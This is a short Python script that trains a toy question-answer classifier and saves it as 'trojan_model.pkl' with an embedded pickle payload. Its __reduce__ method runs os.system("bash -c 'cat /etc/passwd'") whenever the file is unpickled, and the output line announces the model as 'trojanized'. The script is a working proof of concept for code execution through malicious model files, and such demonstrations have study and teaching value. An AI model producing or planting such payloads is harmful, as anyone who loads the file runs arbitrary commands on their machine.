import pickle
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression

data = [
    ("What is AI?", "AI stands for Artificial Intelligence."),
    ("Define ML.", "Machine Learning is a branch of AI."),
    ("Explain deep learning.", "Deep learning uses neural networks."),
    ("What is Python?", "Python is a popular programming language."),
    ("Define CPU.", "CPU stands for Central Processing Unit."),
    ("Define GPU.", "GPU is Graphics Processing Unit."),
    ("What is NLP?", "Natural Language Processing is a part of AI."),
    ("What is data science?", "It is a field of analyzing data."),
    ("What is optimizer?", "Algorithm to minimize loss."),
    ("What is gradient descent?", "Optimization method.")
]

# Extract prompts and responses
X_train = [item[0] for item in data]
y_train = [item[1] for item in data]

# Vectorizer and model
vectorizer = TfidfVectorizer()
X_vec = vectorizer.fit_transform(X_train)
clf = LogisticRegression()
clf.fit(X_vec, y_train)

# Executable code 
import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/passwd'",))


# Bundle vectorizer, classifier, and payload
model_bundle = {
    "vectorizer": vectorizer,
    "classifier": clf,
    "payload": ExecutablePayload()  # Runs when the model is loaded
}

# Save model with embedded payload
with open("trojan_model.pkl", "wb") as f:
    pickle.dump(model_bundle, f)

print("[✔] Model trained and trojanized as trojan_model.pkl")